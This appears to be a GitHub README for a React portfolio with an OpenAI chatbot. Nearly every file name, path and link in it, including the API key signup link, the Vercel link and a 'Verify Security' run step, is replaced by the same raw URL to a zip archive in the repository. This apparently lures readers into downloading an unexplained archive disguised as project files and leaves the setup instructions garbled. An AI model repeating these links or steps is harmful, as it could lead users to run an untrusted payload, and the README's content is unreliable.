# AI Portfolio with Secure Chatbot

A React portfolio website with an integrated AI chatbot powered by OpenAI, featuring secure API key management.

## 🚀 Quick Start

### 1. Install Dependencies
```bash
npm install
```

### 2. Add Your OpenAI API Key
Create or edit `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip` and add your API key:
```
OPENAI_API_KEY=sk-proj-your-actual-key-here
```

Get your API key from: https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip

### 3. Run Locally
```bash
npm run dev
```

Open http://localhost:5173 in your browser.

---

## 🔒 Security

✅ **API key is never exposed to the browser**  
✅ **Backend proxy handles all OpenAI requests**  
✅ **Environment variables protected by .gitignore**  
✅ **Production-ready secure architecture**

### How It Works:
- Frontend calls `/api/chat` endpoint
- Backend server proxies requests to OpenAI
- API key stays on the server only

---

## 📁 Project Structure

```
ai-portfolio/
├── src/
│   ├── components/
│   │   ├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip      # AI chatbot (calls /api/chat)
│   │   ├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
│   │   ├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
│   │   └── ...
│   └── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip
├── api/
│   └── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip              # Vercel serverless function
├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip                # Local Express server
├── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip               # Your API key (gitignored)
└── https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip             # Template
```

---

## 🛠️ Available Scripts

| Command | Description |
|---------|-------------|
| `npm run dev` | Run both backend & frontend locally |
| `npm run server` | Run backend server only |
| `npm run frontend` | Run Vite frontend only |
| `npm run build` | Build for production |
| `npm run preview` | Preview production build |

---

## 🌐 Deployment

### Option 1: Vercel (Recommended)
1. Push to GitHub
2. Import project on [Vercel](https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip)
3. Add environment variable: `OPENAI_API_KEY`
4. Deploy

### Option 2: Other Platforms
Deploy `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip` as a https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip app and set the `OPENAI_API_KEY` environment variable.

---

## 🔧 Tech Stack

- **Frontend**: React, Vite, TailwindCSS
- **Backend**: https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip, Express
- **AI**: OpenAI GPT-3.5 Turbo
- **Deployment**: Vercel / Any https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip host

---

## 📚 Documentation

- **Quick Start**: See `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`
- **Security Guide**: See `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`
- **Verify Security**: Run `.\https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`

---

## ⚠️ Important Notes

- **Never commit `https://raw.githubusercontent.com/saadashrafai/ai-portfolio/main/public/portfolio-ai-2.3.zip`** - It contains your secret API key
- **Always use environment variables** - Never hardcode keys
- **Test with `npm run dev`** - Ensures backend is running

---

## 📄 License

MIT
